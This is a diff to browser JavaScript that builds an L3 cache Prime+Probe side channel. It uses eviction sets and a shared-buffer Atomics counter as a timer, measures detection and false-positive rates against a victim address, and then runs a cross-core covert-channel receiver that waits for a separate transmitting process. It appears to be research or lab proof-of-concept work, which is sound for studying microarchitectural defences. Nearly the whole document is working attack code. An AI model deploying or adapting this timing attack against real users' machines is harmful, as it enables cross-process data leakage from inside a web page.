@@ -298,23 +298,28 @@ class EvictionListL3 {
     traverse() {
         let element = this.head;
         while (element !== END_MARKER) {
-            //this.memory[element + 1]++;
+            // this.memory[element + 1]++;
+            let start = Atomics.load(this.memory, 64);
             element = this.memory[element];
+            let end = Atomics.load(this.memory, 64);
         }
         return element;
     }
 
     probe(){
         let element = this.head;
-        let probe_result = []
+        let THRESHOLD = 80;
+        let ret = 0;
         while (element !== END_MARKER) {
-            //this.memory[element + 1]++;
+            /* use Atomics.load to prevent zeroing out */
             let start = Atomics.load(this.memory, 64);
-            element = this.memory[element];
+            element = Atomics.load(this.memory, element);
             let end = Atomics.load(this.memory, 64);
-            probe_result.push(end-start);
+            if(!ret && end-start > THRESHOLD){
+                ret = 1;
+            } 
         }
-        return probe_result;
+        return ret;
     }
 
     prime(assoc){
@@ -445,79 +450,123 @@ async function l3pp_main(options){
         memory: memory,
     });
 
-    sets = sets.map((set) => {
-        let offsets = set.map(element => element.offset);
-        offsets     = shuffle(offsets);
-        offsets     = offsets.slice(0, EVICTION_SET_MAX_SIZE);
+    let evset = new EvictionListL3(buffer, sets[0]); 
+    let end, start; 
 
-        return {
-            evictor: new EvictionListL3(buffer, offsets),
-            set: set,
-            tag: set[0].tag,
-        };
-    });
+    start = Atomics.load(buffer, 64)
+    evset.traverse()
+    end = Atomics.load(buffer, 64)
+    log(end-start)
 
-    log(`Eviction set count: ${sets.length}`);
-    log(`Eviction set length: ${sets[0].set.length}`);
-
-    let start, end, victim;
-    let evset;
-    let element, result
-
-    let probe_result = []
-
-    evset = sets[0].evictor;
-    victim = 8128;
-    
-    log(end-start);
-    
-    for(let i = 0; i < 10; i++)
-        evset.probe()
-    result = evset.probe()
-    log(result)
-
+    start = Atomics.load(buffer, 64)
+    evset.traverse()
+    end = Atomics.load(buffer, 64)
+    log(end-start)
     
 
-    /* traverse then probe, observe cache hits */
-    let THRESHOLD = 60;
-    let fp = 0; 
-    
-    /* warmup cache */
-    // for(let i = 0; i < 250; i++)
-    //     evset.probe()
-    // for(let i = 0; i < 250; i++){
-    //     result = evset.probe();
-    //     log(result)
-    //     for(let j = 0; j < 12; j++){
-    //         if(result[j] > THRESHOLD){
-    //             fp++;
-    //             break;
-    //         }
-    //     }
-    //     evset.probe();
-    // }
-    //
-    // log(`false-positive: ${fp / 250}`);
-
-    /* traverse+access+probe, observe some misses */
-    let dt = 0;
-    
-    for(let i = 0; i < 500; i++)
-        evset.probe()
-    for(let i = 0; i < 250; i++){
-        // element = Atomics.load(buffer, victim);
+    let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
+    let VICTIM = 8128;
+    /* compute background noise from false-positives */
+    let fp = 0;
+    for(let i = 0; i < WARMUP_ROUNDS; i++){
         result = evset.probe();
-        log(result)
-        for(let j = 0; j < 12; j++){
-            if(result[j] > THRESHOLD){
-                dt++;
-                break;
-            }
-        }
+    }
+    for(let i = 0; i < TRIALS; i++){
+        let result = evset.probe()
+        fp += result; 
+        evset.probe();
+    }
+    log(`false-positive: ${fp/TRIALS}`)
+
+    /* compute detection rate */
+    let detect = 0;
+    for(let i = 0; i < WARMUP_ROUNDS; i++){
+        result = evset.probe();
+    }
+    for(let i = 0; i < TRIALS; i++){
+        let tmp = Atomics.load(buffer, VICTIM / 4);
+        let result = evset.probe();
+        detect += result; 
         evset.probe()
     }
-    log(`detect: ${dt / 250}`);
+    log(`detections: ${detect/TRIALS}`)
 
+    let fp_rate = fp / TRIALS;
+    let detect_rate = detect / TRIALS;
+
+    if(detect_rate > 0.75 && fp_rate < 0.4){
+        log(detect_rate)
+        log(fp_rate)
+        /* compute detection rate */
+        let TRANSMIT_ROUNDS_SIDE = 64
+        let transmit_str = ""
+        for(let i = 0; i < WARMUP_ROUNDS; i++){
+            evset.probe();
+        }
+
+        let correct = 0;
+        let fp = 0;
+        let detect = 0;
+        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
+            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+                let expected = 0;
+                evset.probe();
+                if((i * TRANSMIT_ROUNDS_SIDE + j) % 8 == 0){
+                    expected = 1;
+                    let tmp = Atomics.load(buffer, VICTIM/4);
+                }
+                let result = evset.probe();
+                correct += (result == expected)
+                if(expected){
+                    detect += (result == expected) 
+                } else{
+                    fp += (result != expected)
+                }
+                // transmit_str += result + " "; 
+            }
+            // transmit_str += "\n" 
+        }   
+        // log(transmit_str)
+        log(`Overall Accuracy: ${correct / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE)}`)
+        log(`Detection Rate: ${detect / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE / 8)}`)
+        log(`False-Positive Rate: ${fp / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE / 8 * 7)}`)
+        log("start cross-core attack, please begin transmitting process")
+        await sleep(5000); 
+        transmit_str = "";
+        for(let i  = 0; i < 10; i++){
+            evset.probe();
+        }
+        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
+            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+                // TODO: Test wait state
+                let result = evset.probe();
+                transmit_str += result + " ";
+            }
+            transmit_str += "\n";
+        }
+        log(transmit_str)
+    }
     await stopTimer();
 }
-l3pp_main({offset:0})
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function cross_core_test(evset){
+    transmit_str = "";
+    for(let i  = 0; i < 10; i++){
+        evset.probe();
+    }
+    for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
+        for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+            // TODO: Test wait state
+            let result = evset.probe();
+            transmit_str += result + " ";
+        }
+        transmit_str += "\n";
+    }
+    log(transmit_str)
+}
+
+l3pp_main({offset:63})
